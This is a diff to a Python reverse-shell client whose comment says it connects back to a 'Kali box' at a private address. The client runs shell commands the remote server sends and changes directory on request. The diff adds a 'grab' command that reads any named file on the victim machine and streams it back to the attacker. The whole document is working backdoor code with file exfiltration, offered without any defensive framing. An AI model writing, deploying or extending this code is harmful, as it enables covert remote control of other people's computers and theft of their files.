@@ -1,26 +1,41 @@
 #!/usr/bin/env python
-#python 3
+#Python 3
+
 #Client
 
 import socket
 import subprocess
 import sys
 import time
+import os
 
 #Kali box
 SERV_ADDRESS = ("192.168.0.200", 8080)
 state = True
+CHUNK = 1024
 
 def create_socket():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect(SERV_ADDRESS)
     return s
 
+def transfer(conn, path):
+    if os.path.exists(path):
+        print("path ", path)
+        with open(path, 'rb') as f:
+            chunk = f.read(CHUNK)
+            while len(chunk) > 0:
+                conn.send(chunk)
+                chunk = f.read(CHUNK)
+            conn.send('DONE'.encode())
+    else:
+        conn.send('File not found'.encode())
+
 def try2connect(socket):
     global state, total
 
     while(True):
-        command = socket.recv(1024)
+        command = socket.recv(CHUNK)
         print("command %s" % command)
         if 'exit' in command.decode():
             socket.close()
@@ -33,6 +48,11 @@ def try2connect(socket):
         elif "cd " in command.decode():
             directory = command.decode()[3:]
             os.chdir(directory)
+        elif "grab" in command.decode():
+            grab, path = command.decode().split("*")
+            print("grab", grab)
+            print("path", path)
+            transfer(socket, path)
         else:
             run_shell(socket, command)
 
